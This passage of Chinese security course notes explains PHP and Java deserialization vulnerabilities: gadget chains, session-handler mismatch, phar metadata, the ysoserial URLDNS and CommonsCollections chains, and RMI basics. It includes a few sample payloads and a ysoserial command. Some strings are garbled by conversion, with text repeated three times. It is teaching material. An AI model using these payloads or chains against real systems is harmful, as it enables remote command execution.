<h5 id="序列化特征值"><a href="#序列化特征值" class="headerlink" title="序列化特征值"></a>序列化特征值</h5><ul>
<li>基本格式：<ul>
<li>字符串：s:size:value;</li>
<li>整数：i:value;</li>
<li>布尔：b:value;（1&#x3D;true，0&#x3D;false）</li>
<li>空值：N;</li>
<li>数组：a:size:{key;value;…}</li>
<li>对象：O:name_length:”name”:property_count:{s:prop_length:”prop_name”;prop_value;…}</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759315323661-82dfbc49-5a22-4425-8ed4-b3f8efad666d.png"></p>
<ul>
<li>对象序列化示例：<ul>
<li>O:4:”test”:1:{s:4:”test”;s:2:”ls”;}<ul>
<li>O:4:”test”：对象名”test”（长度4）</li>
<li>:1:：1个成员变量</li>
<li>{s:4:”test”;s:2:”ls”;}：变量名”test”（长度4），值”ls”（长度2）</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759315437319-3e75dfd6-addc-4e34-b578-1016e8d61820.png"></p>
<ul>
<li>注意事项：<ul>
<li>反序列化前必须已定义对应类</li>
<li>未定义类时反序列化会得到__PHP_Incomplete_Class对象</li>
<li>无法调用未定义类的方法</li>
</ul>
</li>
</ul>
<h4 id="反序列化漏洞的初级利用"><a href="#反序列化漏洞的初级利用" class="headerlink" title="反序列化漏洞的初级利用"></a>反序列化漏洞的初级利用</h4><h5 id="Gadget构造"><a href="#Gadget构造" class="headerlink" title="Gadget构造"></a>Gadget构造</h5><h6 id="Gadget是什么"><a href="#Gadget是什么" class="headerlink" title="Gadget是什么"></a>Gadget是什么</h6><p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759315748064-6eda4c1a-6485-434a-94a5-be5ea78c8f0b.png"></p>
<ul>
<li>组成要素: 由不同小组件（类、函数、变量）组成的一条可用攻击链</li>
<li>本质理解: 在反序列化漏洞语境下特指通过寻找PHP应用中的类&#x2F;函数&#x2F;变量构造的完整调用链</li>
<li>攻击原理: 通过构造特定调用链实现在反序列化过程中执行攻击效果</li>
</ul>
<h6 id="PHP中的魔术方法"><a href="#PHP中的魔术方法" class="headerlink" title="PHP中的魔术方法"></a>PHP中的魔术方法</h6><ul>
<li>关键特性:<ul>
<li>自动调用: 如__destruct()在对象销毁时、__wakeup()在反序列化时自动触发</li>
<li>相互调用: 魔术方法内部可以调用其他魔术方法</li>
<li>函数串联: 可通过魔术方法调用普通函数实现攻击链连接</li>
</ul>
</li>
<li>常用方法:<ul>
<li>__construct(): 对象创建时调用（但unserialize时不触发）</li>
<li>__toString(): 对象被当作字符串输出时触发</li>
<li>__wakeup(): 反序列化时优先触发的入口点</li>
</ul>
</li>
</ul>
<p> Gadget构造示例  </p>
<pre><code>- 攻击目标: 触发system函数执行系统命令
- 调用链分析:
    * 通过$_GET参数传入序列化数据
    * unserialize()触发test类的__wakeup()
    * __wakeup()实例化test2类触发__construct()
    * __construct()执行system($this-&gt;test)
- 关键控制点:
    * test类的$test成员变量作为system参数
    * 通过序列化控制$test的值实现命令注入
- 构造步骤:
    * 创建test类实例
    * 设置$test为待执行命令
    * 获取序列化字符串
    * 通过GET参数传入触发
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759315906061-856f6e70-b4a3-47f8-9669-ef888468d681.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759315994946-7bce7a17-9a7d-4ef0-8107-b9007b124e07.png"></p>
<h5 id="命名空间中的反序列化漏洞"><a href="#命名空间中的反序列化漏洞" class="headerlink" title="命名空间中的反序列化漏洞"></a>命名空间中的反序列化漏洞</h5><ul>
<li>核心作用: 解决两类编程问题<ul>
<li>命名冲突: 用户代码与PHP内部&#x2F;第三方组件命名冲突</li>
<li>别名简化: 为长标识符创建简短别名提高可读性</li>
</ul>
</li>
<li>本质特性: 一种封装事物的方法，类似文件目录结构</li>
</ul>
<h6 id="命名空间定义方法"><a href="#命名空间定义方法" class="headerlink" title="命名空间定义方法"></a>命名空间定义方法</h6><p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759316070726-5bf33537-e7a4-4854-ac47-d84f8a0a6e6d.png"></p>
<ul>
<li>声明规则:<ul>
<li>使用namespace关键字</li>
<li>必须位于所有代码之前（除declare语句）</li>
</ul>
</li>
<li>影响范围:<ul>
<li>类(class)</li>
<li>接口(interface)</li>
<li>函数(function)</li>
<li>常量(const)</li>
</ul>
</li>
</ul>
<h6 id="命名空间与目录和文件的关系"><a href="#命名空间与目录和文件的关系" class="headerlink" title="命名空间与目录和文件的关系"></a>命名空间与目录和文件的关系</h6><ul>
<li>层级结构: 支持类似目录的嵌套结构（如test\sub\level）</li>
<li>完全限定名: 实例化时需要指定完整命名空间路径（如\test\sub\level\test_class）</li>
</ul>
<h6 id="use关键字引入命名空间-10-16"><a href="#use关键字引入命名空间-10-16" class="headerlink" title="use关键字引入命名空间 10:16"></a>use关键字引入命名空间 10:16</h6><ul>
<li>作用机制: 切换当前上下文到指定命名空间</li>
<li>使用注意: 引入后实例化操作默认在use指定的命名空间下进行</li>
</ul>
<h6 id="全局非命名空间"><a href="#全局非命名空间" class="headerlink" title="全局非命名空间"></a>全局非命名空间</h6><ul>
<li>恢复方法: 使用namespace{}语法块</li>
<li>作用范围: 大括号内代码处于全局命名空间</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759316175982-aa17af5e-296a-458d-9b5d-bc727b4110f1.png"></p>
<p> 命名空间使用示例  </p>
<pre><code>- 关键发现: 序列化值包含完整命名空间路径
- 反序列化要求: 必须保持类名与原始命名空间完全一致
</code></pre>
<p> Laravel反序列化漏洞  </p>
<pre><code>- 核心区别:
    * 普通反序列化只需类名
    * 命名空间下需要完整限定名（如Illuminate\Foundation\Application）
- 构造要点:
    * 精确匹配目标类的命名空间路径
    * 序列化字符串必须包含完整命名空间信息
    * 注意use语句引入的命名空间切换
</code></pre>
<h4 id="PHP反序列化漏洞的高级利用"><a href="#PHP反序列化漏洞的高级利用" class="headerlink" title="PHP反序列化漏洞的高级利用"></a>PHP反序列化漏洞的高级利用</h4><h5 id="PHP中的Session反序列化"><a href="#PHP中的Session反序列化" class="headerlink" title="PHP中的Session反序列化"></a>PHP中的Session反序列化</h5><h6 id="Session中的反序列化机制-00-18"><a href="#Session中的反序列化机制-00-18" class="headerlink" title="Session中的反序列化机制 00:18"></a>Session中的反序列化机制 00:18</h6><ul>
<li>触发条件：当调用session_start()函数或php.ini中session.auto_start设置为1时，PHP会调用会话管理器</li>
<li>存储过程：当前用户的Session会被序列化后存储到指定目录（默认为&#x2F;tmp）</li>
<li>核心特点：用户Session信息会被序列化后存放到磁盘文件中</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759316800050-9707ee1d-79ba-48c9-b70b-ddf916eeb95b.png"></p>
<h6 id="PHP处理器的三种序列化方式"><a href="#PHP处理器的三种序列化方式" class="headerlink" title="PHP处理器的三种序列化方式"></a>PHP处理器的三种序列化方式</h6><ul>
<li>php_binary：键名长度对应的ASCII字符+键名+serialize()序列化值</li>
<li>php：键名+竖线(|)+serialize()序列化值</li>
<li>php_serialize：直接使用serialize()函数序列化数组方式</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759316817727-1f209d31-ec56-4901-b4bc-71ded3b0cb38.png"></p>
<h6 id="配置文件php-ini中与session存储配置相关的重要配置项"><a href="#配置文件php-ini中与session存储配置相关的重要配置项" class="headerlink" title="配置文件php.ini中与session存储配置相关的重要配置项"></a>配置文件php.ini中与session存储配置相关的重要配置项</h6><ul>
<li>session.save_path：设置session存储路径，默认为&#x2F;tmp</li>
<li>session.auto_start：控制会话模块是否在请求开始时启动，默认为0（不启动）</li>
<li>session.serialize_handler：定义序列化&#x2F;反序列化处理器名称，默认为php</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759316868161-680bd7b7-0b89-4034-b375-fbb376f7f9bc.png"></p>
<h6 id="示例代码分析"><a href="#示例代码分析" class="headerlink" title="示例代码分析"></a>示例代码分析</h6><ul>
<li><p>存储过程：使用php_serialize处理器存储GET参数到session</p>
</li>
<li><p>文件格式：存储格式为数组形式，如a:1:{s:3:”ctf”;s:17:”this is test data”;}</p>
</li>
<li><p>安全问题：当存储和读取使用不同处理器时会产生漏洞</p>
</li>
<li><p>漏洞原理：读取页面使用php处理器，会以竖线分割键值</p>
</li>
<li><p>利用方式：传入精心构造的ctf参数，如|O:3:”ctf”:1:{s:1:”a”;s:4:”ls &#x2F;“;}</p>
</li>
<li><p>触发条件：访问读取页面时会自动反序列化并执行危险操作</p>
</li>
</ul>
<h5 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h5><h6 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h6><ul>
<li>定义：PHP归档文件，用于打包PHP代码和资源文件</li>
<li>扩展名：默认使用.phar作为文件扩展名</li>
<li>特点：需要自定义PHP代码来创建和使用</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759317082281-9b564b95-4c96-442e-90b7-498a884b588f.png"></p>
<h6 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h6><ul>
<li>stub：识别phar扩展的标识，格式为$xxx<?php xxx; __HALT_COMPILER();?></li>
<li>manifest：包含压缩文件权限、属性等信息，核心是序列化存储的metadata</li>
<li>内容：实际压缩的文件内容</li>
<li>签名：可选的文件签名部分</li>
</ul>
<h6 id="使用Phar类的方法"><a href="#使用Phar类的方法" class="headerlink" title="使用Phar类的方法"></a>使用Phar类的方法</h6><ul>
<li>前提条件：php.ini中phar.readonly必须设置为0或Off</li>
<li>常用方法：<ul>
<li>new Phar()：实例化phar对象</li>
<li>startBuffering()：开始缓冲写操作</li>
<li>addFromString()：以字符串形式添加文件</li>
<li>buildFromDirectory()：归档目录下所有文件</li>
<li>extractTo()：解压phar包</li>
</ul>
</li>
</ul>
<h6 id="Phar伪协议"><a href="#Phar伪协议" class="headerlink" title="Phar伪协议"></a>Phar伪协议</h6><ul>
<li>特点：不依赖unserialize()直接进行反序列化操作</li>
<li>利用点：读取phar文件时会反序列化metadata</li>
<li>影响范围：几乎所有文件操作函数都会触发此问题</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759317214144-43177728-d1b2-4c8f-8e51-4c63c175ba1c.png"></p>
<p> 例题:phar文件反序列化  </p>
<pre><code>- 创建过程：设置metadata为自定义对象，会被序列化存储
- 利用方式：通过phar://协议触发反序列化
- 触发函数：file_get_contents等文件操作函数
- 影响函数：包括但不限于file_exists、is_dir、unlink、copy等
- 完整列表：fileatime、filectime、stat、fileinode、fileowner、fileperms、readfile、fopen、is_executable、is_file、is_link、is_readable、is_writeable、parse_ini_file等  
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759317291509-48d60de4-7fc1-4a7c-959c-55e536897cd3.png"></p>
<h2 id="八，Java中反射与序列化"><a href="#八，Java中反射与序列化" class="headerlink" title="八，Java中反射与序列化"></a><font style="color:#DF2A3F;">八，Java中反射与序列化</font></h2><h5 id="Java反射基础知识-00-26"><a href="#Java反射基础知识-00-26" class="headerlink" title="Java反射基础知识 00:26"></a>Java反射基础知识 00:26</h5><h6 id="1）反射式编程-00-28"><a href="#1）反射式编程-00-28" class="headerlink" title="1）反射式编程 00:28"></a>1）反射式编程 00:28</h6><ul>
<li>核心概念：指程序在运行时(runtime)可以访问、检测和修改自身状态或行为的能力</li>
<li>典型特征：<ul>
<li>通过特征值直接获取内存中的内容</li>
<li>不同于常规的代码执行流程</li>
</ul>
</li>
<li>代码示例：</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373165792-a93e1162-0a8d-4725-87ed-cfdd8572b619.png"></p>
<h6 id="2）反射核心方法-01-50"><a href="#2）反射核心方法-01-50" class="headerlink" title="2）反射核心方法 01:50"></a>2）反射核心方法 01:50</h6><ul>
<li>获取类对象forName<ul>
<li>功能：通过全限定类名获取Class对象</li>
<li>特点：适用性最广，不需要上下文存在实例或import语句</li>
<li>注意事项：类必须位于当前ClassLoader中</li>
</ul>
</li>
<li>实例化类对象newInstance 02:03<ul>
<li>功能：创建类的实例</li>
<li>限制：只能调用无参构造函数，无法访问private构造方法</li>
</ul>
</li>
<li>获取类方法getMethod 02:20<ul>
<li>参数要求：需要指定方法名和参数类型列表</li>
<li>重载处理：通过参数类型区分同名方法的不同实现</li>
</ul>
</li>
<li>执行方法invoke 02:32<ul>
<li>调用要素：需要提供方法所属对象实例和实际参数</li>
<li>执行流程：先获取Method对象，再通过invoke执行</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373189980-892aa3de-65cf-4ad4-83bd-15e6b1cb3916.png"></p>
<h6 id="3）获取类对象的方法-02-42"><a href="#3）获取类对象的方法-02-42" class="headerlink" title="3）获取类对象的方法 02:42"></a>3）获取类对象的方法 02:42</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373248516-e1167625-4a85-4a15-aed9-70ed265bff23.png"></li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373298732-bbc3e7ff-10ac-46b1-b98e-aff690442c38.png"></li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373395582-3b13a6a4-1ccb-40b1-9d68-8dda4928294c.png"></li>
<li>三种方式：<ul>
<li>object.getClass()：需要已有实例对象</li>
<li>TargetClass.class：需要已加载该类</li>
<li>Class.forName()：只需知道类名，适用性最广</li>
</ul>
</li>
<li>类型说明：获取的是java.lang.Class类型，不是具体实例</li>
</ul>
<h6 id="4）Class-forName深入解析-04-07"><a href="#4）Class-forName深入解析-04-07" class="headerlink" title="4）Class.forName深入解析 04:07"></a>4）Class.forName深入解析 04:07</h6><ul>
<li>方法参数<ul>
<li>完整形式：Class.forName(className, true, currentLoader)</li>
<li>默认值：<ul>
<li>初始化参数默认为true</li>
<li>使用当前ClassLoader查找类</li>
</ul>
</li>
<li>安全影响：初始化参数在漏洞利用中很关键</li>
</ul>
</li>
<li><h2 id="JVM类加载过程-06-03"><a href="#JVM类加载过程-06-03" class="headerlink" title="JVM类加载过程 06:03"></a>JVM类加载过程 06:03</h2><ul>
<li>主要阶段：加载→验证→准备→解析→初始化</li>
<li>初始化阶段：<ul>
<li>执行类构造器<clinit>()</li>
<li>合并所有静态变量赋值和static{}块语句</li>
</ul>
</li>
<li>反射影响：Class.forName会触发初始化过程</li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373464692-9b88b2f1-ac52-4213-86e1-76d33aaf7d2a.png"></li>
</ul>
</li>
<li>应用案例 08:34<ul>
<li>静态代码块执行 05:28<ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373490461-2392f7b7-ab35-4326-81b1-a21de72f7740.png"></li>
<li>示例代码：</li>
</ul>
</li>
<li>执行差异：<ul>
<li>Class.forName：只执行static块</li>
<li>new Demo()：完整执行所有初始化代码</li>
<li>Class.forName(…, false, …)：无任何输出</li>
</ul>
</li>
<li>漏洞利用示例<ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373510656-ad1820c4-0335-4000-b29a-9e2495bd77f1.png"></li>
<li>利用原理：通过控制Class.forName参数执行恶意静态代码块</li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373566773-866fde34-1779-46e4-87ab-5649a5f059bb.png"></li>
<li>典型payload：</li>
</ul>
</li>
<li>Runtime反射调用 09:44<ul>
<li>完整调用链：</li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373676662-6bb471e8-5588-4c55-b0dd-b3bf3f19fedb.png"></li>
</ul>
</li>
<li>关键点：<ul>
<li>必须通过getRuntime()获取实例</li>
<li>不能直接newInstance()（构造方法为private）</li>
</ul>
</li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373797174-fec7b14d-8d6f-4b1a-8128-8ed2927607b5.png"></li>
<li>构造方法处理 15:18<ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373811766-6cda6ad0-301c-4c3a-bf42-d3ce70334f9e.png"></li>
<li>有参构造：使用getConstructor指定参数类型</li>
</ul>
</li>
<li>私有构造：<ul>
<li>使用getDeclaredConstructor获取私有构造方法</li>
<li>配合setAccessible(true)突破访问限制</li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373892067-6a9617d3-eb06-409c-8193-ceda0c83d67d.png"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="3-Java序列化原理-18-02"><a href="#3-Java序列化原理-18-02" class="headerlink" title="3. Java序列化原理 18:02"></a>3. Java序列化原理 18:02</h5><h6 id="1）反序列化函数和序列化函数-18-04"><a href="#1）反序列化函数和序列化函数-18-04" class="headerlink" title="1）反序列化函数和序列化函数 18:04"></a>1）反序列化函数和序列化函数 18:04</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373954733-4e289dfd-928c-4f9d-91f6-a1e80d75dace.png"></li>
<li>核心函数：Java反序列化的两个关键函数是readObject()和writeObject()</li>
<li>功能对应：<ul>
<li>readObject()对应PHP中的unserialize()函数</li>
<li>writeObject()对应PHP中的serialize()函数</li>
</ul>
</li>
<li>接口要求：类必须实现java.io.Serializable接口才能进行序列化和反序列化操作</li>
</ul>
<h6 id="2）应用案例-18-59"><a href="#2）应用案例-18-59" class="headerlink" title="2）应用案例 18:59"></a>2）应用案例 18:59</h6><ul>
<li>示例1<ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759373968326-9a1bc01d-3966-485c-b2ba-9d16c7279731.png"></li>
<li>类定义：</li>
<li>方法特点：<ul>
<li>与PHP不同，Java允许开发者自定义序列化&#x2F;反序列化过程</li>
<li>通过重写writeObject()和readObject()方法可以修改默认行为</li>
<li>示例中在序列化时添加了额外数据”Add New Data”</li>
</ul>
</li>
<li>自定义实现：</li>
</ul>
</li>
<li>示例2 20:17<ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759374049884-c4811845-11e4-40de-955d-43953eaf3343.png"></li>
<li>序列化过程：</li>
<li>反序列化过程：</li>
<li>运行结果：</li>
<li>参数说明：<ul>
<li>writeObject()需要传入要序列化的对象</li>
<li>readObject()不需要参数，因为它从文件输入流中读取数据</li>
<li>文件流对象在构造时已经指定了数据来源文件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="一、Java反序列化漏洞入门利用-00-00"><a href="#一、Java反序列化漏洞入门利用-00-00" class="headerlink" title="一、Java反序列化漏洞入门利用 00:00"></a>一、Java反序列化漏洞入门利用 00:00</h4><h5 id="1-反序列化漏洞原理-00-23"><a href="#1-反序列化漏洞原理-00-23" class="headerlink" title="1. 反序列化漏洞原理 00:23"></a>1. 反序列化漏洞原理 00:23</h5><h6 id="1）反序列化漏洞原理介绍-00-53"><a href="#1）反序列化漏洞原理介绍-00-53" class="headerlink" title="1）反序列化漏洞原理介绍 00:53"></a>1）反序列化漏洞原理介绍 00:53</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759374172765-7ce227a2-edef-4661-a41e-42b628296dd8.png"></li>
<li>核心机制：将带有恶意属性值的对象序列化值进行反序列化操作时，自动执行的函数调用链将被恶意属性利用，最终造成恶意函数的执行。</li>
<li>危险函数触发：当类重写readObject()方法时，若其中包含危险函数（如Runtime.getRuntime().exec()Runtime.getRuntime().exec()Runtime.getRuntime().exec()）且参数可控，攻击者可通过控制成员变量实现命令执行。</li>
<li>示例说明：示例类MyObject中，若Runtime.exec()Runtime.exec()Runtime.exec()的参数改为成员变量name，攻击者通过反序列化控制name值即可实现任意命令执行。</li>
</ul>
<h6 id="2）通过自动存在的函数调用关系构造一个链式关系-03-15"><a href="#2）通过自动存在的函数调用关系构造一个链式关系-03-15" class="headerlink" title="2）通过自动存在的函数调用关系构造一个链式关系 03:15"></a>2）通过自动存在的函数调用关系构造一个链式关系 03:15</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759374282205-0878650e-77c1-4c50-93bd-4f069b0929af.png"></li>
<li>调用链本质：反序列化时自动执行readObject()方法，若该方法中嵌套调用其他函数（如示例中的Runtime.exec()Runtime.exec()Runtime.exec()），形成类似”MyObject.readObject()→Runtime.exec()MyObject.readObject()→Runtime.exec()MyObject.readObject()→Runtime.exec()”的链式关系。</li>
<li>漏洞利用关键：需要找到从反序列化入口到危险函数的完整调用路径，这种多层级嵌套调用的结构被称为”利用链”（Gadget Chain）。</li>
</ul>
<h5 id="2-构造Java反序列化利用链-04-20"><a href="#2-构造Java反序列化利用链-04-20" class="headerlink" title="2. 构造Java反序列化利用链 04:20"></a>2. 构造Java反序列化利用链 04:20</h5><h6 id="1）URLDNS-05-08"><a href="#1）URLDNS-05-08" class="headerlink" title="1）URLDNS 05:08"></a>1）URLDNS 05:08</h6><ul>
<li>ysoserial命令使用示例 08:43<ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759374324352-1776251a-094a-41f0-8589-580b04d6180e.png"></li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759374491534-bb035585-c2d2-40c8-98b8-4d163d759833.png"></li>
<li>工具使用：通过命令java−jarysoserial−0.0.6−SNAPSHOT−all.jarURLDNS”<a target="_blank" rel="noopener" href="http://demo.test.com"java/">http://demo.test.com&quot;java</a> -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS “<a target="_blank" rel="noopener" href="http://demo.test.com"java−jarysoserial−0.0.6−snapshot−all.jarurldns"http//demo.test.com%22%E7%94%9F%E6%88%90%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%85%B6%E4%B8%ADURLDNS%E6%8C%87%E5%AE%9A%E5%88%A9%E7%94%A8%E9%93%BE%E7%B1%BB%E5%9E%8B%EF%BC%8Chttp%E5%9C%B0%E5%9D%80%E4%B8%BA%E8%A7%A6%E5%8F%91DNS%E8%AF%B7%E6%B1%82%E7%9A%84%E7%9B%AE%E6%A0%87%E3%80%82">http://demo.test.com&quot;java−jarysoserial−0.0.6−SNAPSHOT−all.jarURLDNS&quot;http://demo.test.com&quot;生成序列化数据，其中URLDNS指定利用链类型，http地址为触发DNS请求的目标。</a></li>
<li>输出特征：生成的序列化数据包含可读字符（如demo.test.comdemo.test.comdemo.test.com）和不可读二进制数据，符合Java序列化格式标准。</li>
</ul>
</li>
<li>对象组装以及序列化 10:14<ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759374551051-4cf5529a-6370-4a22-a533-0825c513a750.png"></li>
<li>恶意对象构造：通过getObject()方法创建包含URL对象的HashMap，关键步骤包括：<ul>
<li>使用SilentURLStreamHandler避免本地DNS缓存</li>
<li>通过Reflections.setFieldValue(u,”hashCode”,−1)Reflections.setFieldValue(u,”hashCode”,-1)Reflections.setFieldValue(u,”hashCode”,−1)清除hash值强制重新计算</li>
<li>HashMap的键值对设置（ht.put(u,url)ht.put(u,url)ht.put(u,url)）为后续触发点埋下伏笔</li>
</ul>
</li>
</ul>
</li>
<li>hash map的调用过程 11:27<ul>
<li>完整调用链：</li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759374714052-31b91867-3042-43f8-a37d-8479470ff9bb.png"></li>
<li>HashMap.readObject()→hash()→URL.hashCode()→URLStreamHandler.hashCode()→getHostAddress()HashMap.readObject()→hash()→URL.hashCode()→URLStreamHandler.hashCode()→getHostAddress()HashMap.readObject()→hash()→URL.hashCode()→URLStreamHandler.hashCode()→getHostAddress()</li>
<li>触发原理：反序列化时HashMap自动计算键的hash值，触发URL对象的hashCode方法，最终通过getHostAddress()发起DNS请求。</li>
</ul>
</li>
</ul>
<h6 id="2）CommonsCollections-13-55"><a href="#2）CommonsCollections-13-55" class="headerlink" title="2）CommonsCollections 13:55"></a>2）CommonsCollections 13:55</h6><ul>
<li><h2 id="Gadget-chain介绍-14-29"><a href="#Gadget-chain介绍-14-29" class="headerlink" title="Gadget chain介绍 14:29"></a>Gadget chain介绍 14:29</h2><ul>
<li>链式结构：ObjectInputStream.readObject()→AnnotationInvocationHandler.readObject()→Map.entrySet()→AnnotationInvocationHandler.invoke()→LazyMap.get()→ChainedTransformer.transform()→…→Runtime.exec()ObjectInputStream.readObject()→AnnotationInvocationHandler.readObject()→Map.entrySet()→AnnotationInvocationHandler.invoke()→LazyMap.get()→ChainedTransformer.transform()→…→Runtime.exec()ObjectInputStream.readObject()→AnnotationInvocationHandler.readObject()→Map.entrySet()→AnnotationInvocationHandler.invoke()→LazyMap.get()→ChainedTransformer.transform()→…→Runtime.exec()</li>
<li>反射调用核心：通过多个Transformer的transform方法串联，最终使用反射（Method.invoke()Method.invoke()Method.invoke()）调用Runtime.getRuntime().exec()Runtime.getRuntime().exec()Runtime.getRuntime().exec()执行系统命令。</li>
</ul>
</li>
<li><h2 id="ConstantTransformer作用-16-05"><a href="#ConstantTransformer作用-16-05" class="headerlink" title="ConstantTransformer作用 16:05"></a>ConstantTransformer作用 16:05</h2><ul>
<li>反射起点：ConstantTransformer作为调用链起点，其transform方法直接返回构造函数传入的对象（return iConstant），为后续反射调用提供初始对象。</li>
</ul>
</li>
<li>同级关系的完成 16:36<ul>
<li>链式组装：通过ChainedTransformer的for循环依次调用多个Transformer的transform方法，形成”ConstantTransformer→InvokerTransformer→InvokerTransformer→InvokerTransformer”的级联调用。</li>
</ul>
</li>
<li><h2 id="transformer被调用的过程-17-47"><a href="#transformer被调用的过程-17-47" class="headerlink" title="transformer被调用的过程 17:47"></a>transformer被调用的过程 17:47</h2><ul>
<li>危险函数定位：最终通过三个InvokerTransformer分别完成：<ul>
<li>Class.getMethod()Class.getMethod()Class.getMethod()获取Runtime类方法</li>
<li>Method.invoke()Method.invoke()Method.invoke()调用getRuntime方法</li>
<li>Method.invoke()Method.invoke()Method.invoke()执行exec命令</li>
</ul>
</li>
<li>修复方案：Apache Commons Collections官方移除了InvokerTransformer类，直接切断该利用链的关键环节。</li>
</ul>
</li>
</ul>
<h4 id="一、Java协议中的反序列化漏洞-00-02"><a href="#一、Java协议中的反序列化漏洞-00-02" class="headerlink" title="一、Java协议中的反序列化漏洞 00:02"></a>一、Java协议中的反序列化漏洞 00:02</h4><h5 id="1-RMI简介-00-11"><a href="#1-RMI简介-00-11" class="headerlink" title="1. RMI简介 00:11"></a>1. RMI简介 00:11</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759374957423-f329bee9-8691-47db-bf1b-7cc5216f7ce6.png"></li>
<li>课程结构：本节分为两部分，第一部分介绍RMI基础通信细节，第二部分讲解RMI体系下的利用手法。</li>
</ul>
<h6 id="1）什么是Java-RMI-00-30"><a href="#1）什么是Java-RMI-00-30" class="headerlink" title="1）什么是Java RMI 00:30"></a>1）什么是Java RMI 00:30</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759375075157-0808306a-32bf-486b-a8d8-fce398e82105.png"></li>
<li>概念本质：Remote Method Invocation是为Java环境设计的远程方法调用机制</li>
<li>实现区别：RMI是设计思想，Java RMI是该思想在Java中的具体实现</li>
<li>应用场景：当本地需要调用远程机器上的算法实现但无法&#x2F;不便在本地搭建环境时使用，典型案例：本地数据交由远程机器处理并返回结果</li>
</ul>
<h6 id="2）JRMP-02-06"><a href="#2）JRMP-02-06" class="headerlink" title="2）JRMP 02:06"></a>2）JRMP 02:06</h6><ul>
<li>协议全称：Java Remote Message Protocol（Java远程消息交换协议）</li>
<li>层级关系：运行于Java RMI之下，是RMI协议的底层实现基础</li>
</ul>
<h6 id="3）RMI通信过程-02-36"><a href="#3）RMI通信过程-02-36" class="headerlink" title="3）RMI通信过程 02:36"></a>3）RMI通信过程 02:36</h6><ul>
<li>核心角色：<ul>
<li>Client：发起RMI请求的终端（如需要处理数据的本机）</li>
<li>Registry：存储远程对象信息的注册中心，提供地址映射服务</li>
<li>Server：远程方法的实际实现方和执行方（数据处理的实际发生地）</li>
</ul>
</li>
</ul>
<h6 id="4）RMI的安全问题-04-55"><a href="#4）RMI的安全问题-04-55" class="headerlink" title="4）RMI的安全问题 04:55"></a>4）RMI的安全问题 04:55</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759375099682-6860c2c0-f870-4c24-bf5c-98fd8f65ff88.png"></li>
<li>根本原因：传输过程基于反序列化实现</li>
<li>通信流程：<ul>
<li>Server注册远程对象名称到Registry</li>
<li>Client通过名称查询远程对象</li>
<li>Registry返回Stub给Client</li>
<li>Client通过Stub发起远程方法调用</li>
<li>Server处理调用并返回结果（图中未展示）</li>
</ul>
</li>
</ul>
<h6 id="5）Stub对象-06-35"><a href="#5）Stub对象-06-35" class="headerlink" title="5）Stub对象 06:35"></a>5）Stub对象 06:35</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759375262324-bdbd7bcf-6321-4e1a-8e0f-89a859b4074c.png"></li>
<li>角色定位：远程对象的本地代理，由Registry提供给Client</li>
<li>核心功能：<ul>
<li>与远程JVM建立连接</li>
<li>序列化(marshal)参数并传输</li>
<li>等待执行结果</li>
<li>反序列化(unmarshal)返回值&#x2F;错误</li>
<li>返回结果给调用程序</li>
</ul>
</li>
<li>技术本质：负责参数&#x2F;返回值的序列化、网络通信等底层操作</li>
</ul>
